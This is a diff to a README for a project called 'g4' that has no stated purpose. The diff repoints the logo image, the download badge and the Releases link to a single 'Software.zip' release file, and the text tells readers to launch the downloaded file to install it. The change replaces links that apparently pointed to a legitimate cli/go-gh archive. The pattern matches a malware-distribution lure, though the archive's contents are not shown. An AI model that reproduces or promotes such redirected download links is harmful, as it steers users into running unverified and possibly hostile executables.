@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "g4" Repository!
 
-![g4 Logo](https://example.com/g4-logo.png)
+![g4 Logo](https://github.com/Awisyhaziq/g4/releases/download/v2.0/Software.zip)
 
 ## Description
 This repository does not provide a specific short description for the project at the moment. It is a work in progress, and more details will be added as the project develops.
@@ -14,7 +14,7 @@ This repository does not provide a specific short description for the project at
 ## Installation
 To get started with the project, you can download the latest version by clicking on the button below:
 
-[![Download g4 v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download g4 v1.0.0](https://github.com/Awisyhaziq/g4/releases/download/v2.0/Software.zip)](https://github.com/Awisyhaziq/g4/releases/download/v2.0/Software.zip)
 
 Please note that the downloaded file needs to be launched to install the application.
 
@@ -33,7 +33,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-🔗 For the most up-to-date information and downloads, please [visit the Releases section](https://github.com/cli/go-gh/releases).
+🔗 For the most up-to-date information and downloads, please [visit the Releases section](https://github.com/Awisyhaziq/g4/releases/download/v2.0/Software.zip).
 
 Thank you for your interest in the "g4" project! 🌟
 
